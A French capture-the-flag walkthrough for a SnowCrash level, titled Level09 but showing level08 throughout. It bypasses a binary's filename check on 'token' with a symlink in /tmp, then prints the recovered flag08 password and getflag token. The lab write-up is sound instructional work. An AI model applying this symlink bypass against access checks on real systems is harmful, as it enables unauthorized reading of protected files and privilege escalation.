# Level09 - Interprétation de programme
Pour résoudre le level09, on a un fichier level09 et un fichier token. Quand on exécute level09, on nous demande de lui donner un fichier à lire.

```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

On lui donne token, mais le programme nous dit que nous n'avons pas le droit de le lire.

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

On utilise `strings` sur le programme, et on peut voir une ligne mentionnant `token`, et plus bas un appel à la fonction `strstr`:

```
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
...
strstr@@GLIBC_2.0
```

Si on essaie d'exécuter le programme avec n'importe quel autre fichier, ce dernier est lu sans soucis. On en conclus donc qu'il y a une protection sur le nom du fichier que le programme lis, et que si ce dernier contient "token", il ne sera pas lu. Comme nous n'avons pas le droit de renommer token ou de le copier, on crée un lien symbolique qui sera nommé autrement.

```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/toto
level08@SnowCrash:~$ ./level08 /tmp/toto
quif5eloekouj29ke0vouxean
```

On se connecte sur le compte flag08 et on obtient notre token:

```
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

On a notre token: `25749xKZ8L7DkSCwJkT9dyv6f`

